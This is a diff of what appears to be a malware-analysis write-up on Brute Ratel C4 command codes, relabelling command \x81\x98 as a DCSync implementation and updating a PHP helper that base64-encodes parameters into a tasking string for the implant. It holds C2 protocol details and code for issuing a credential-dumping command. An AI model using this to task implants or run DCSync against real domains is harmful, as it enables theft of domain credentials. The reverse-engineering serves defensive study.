@@ -7,6 +7,8 @@ date: 2025-03-28
 
 ## BRUTERATEL COMMAND LIST PART 4 
 
+updated : 10/04/2025  
+
 ## Context  
 
 BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  
@@ -37,7 +39,7 @@ Here is a short description of the next 20 command codes and purpose :
 
 | Command ID   | Description             | Parameter         |
 | :----------- | :---------------------- | :----------------:|
-| "\x81\x98"  | [ASN1_unknown](#ASN1_unknown) | $p1 $p2 |
+| "\x81\x98"  | [DCSync](#DCSync) | $TypeFormatString $ProcFormatString |
 | "\x53\x49"   | [netshareenum](#netshareenum) | $servername, $level |
 | "\x13\x52"  | [ExecWQLQuery](#ExecWQLQuery) | $query |
 | "\xe7\x81"   | [GetAccountSidFromPid](#GetAccountSidFromPid) | $pid |
@@ -60,35 +62,22 @@ Here is a short description of the next 20 command codes and purpose :
 
 In the following section, I share some dynamic analysis results from the aforementioned commands :  
 
-<a id="ASN1_unknown"></a>
-# ASN1_unknown
+<a id="DCSync"></a>
+# DCSync
 
-update : 10/04/2025  
+updated : 10/04/2025  
 
-This function would require some more reverse-engineering to enable a full runtime execution.  
-It's a very likely implementation based from the work of   
+It's a very likely implementation on the DCSync attack based from the work of   
 Vicent Le Toux [MakeMeEntrepriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1)  
 and Benjamin Delpy [MimiKatz](https://github.com/gentilkiwi/mimikatz/)  
 
 ```php
-/*
-	$p1 : sizeof = 1757
-	$p2 : sizeof = 853
-*/
-function ASN1_unknown($p1, $p2)
+function DCSync($TypeFormatString, $ProcFormatString)
 {
-	$p1 = "";
-	for ($i = 0; $i < 1757; $i++)
-		$p1 = $p1 . "A";
-		
-	$p2 = "";
-	for ($i = 0; $i < 853; $i++)
-		$p2 = $p2 . "B";
+	$TypeFormatString_b64 = base64_encode($TypeFormatString);
+	$ProcFormatString_b64 = base64_encode($ProcFormatString);
 	
-	$p1_b64 = base64_encode($p1);
-	$p2_b64 = base64_encode($p2);
-	
-	$cmd_id = "\x81\x98 $p1_b64 $p2_b64 AA BB CC DD EE FF GG HH II JJ KK LL MM NN";
+	$cmd_id = "\x81\x98 $TypeFormatString_b64 $ProcFormatString_b64 AA BB CC DD EE FF GG HH II JJ KK LL MM NN";
 	$cmd_id_b64 = base64_encode($cmd_id);
 	
 	return $cmd_id_b64;
